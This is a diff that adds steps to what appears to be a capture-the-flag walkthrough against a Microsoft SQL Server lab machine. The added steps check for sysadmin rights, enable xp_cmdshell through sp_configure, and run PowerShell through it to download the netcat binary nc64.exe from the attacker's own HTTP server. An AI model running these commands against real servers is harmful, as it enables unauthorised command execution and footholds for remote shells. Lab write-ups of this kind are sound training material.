@@ -27,4 +27,15 @@ Impacket is a collection of Python classes for working with network protocols. I
    https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
 
 6. and from this cheat-sheet i will use this `SELECT is_srvrolemember('sysadmin');` continue using the cheat-sheet to see , from the command above the result is 1 and that mean it `true` which mean i'm admin or `sysadmin` .
-7. 
+7. after you know you'r admin use this script to enable shell
+ ```
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure; - Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+8.  now we will use this file [ne64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) , but first we need to run Power-Shell because it better than normal command prompt , to do this we will use this command `xp_cmdshell "powershell -c command"`  replace `commnad` with any command you want to perform , i use `pwd` to know where we are , and this is the output `C:\Windows\system32` but we cannot write here , so after some enumeration i know that download will be great 
+9. now we need to upload this  [ne64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) file , and for that we will use this 
+   command `sudo python3 -m http.server 80` in our terminal , now in the server terminal do this command  `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;wgethttp://10.10.14.9/nc64.exe -outfile nc64.exe"` 
+
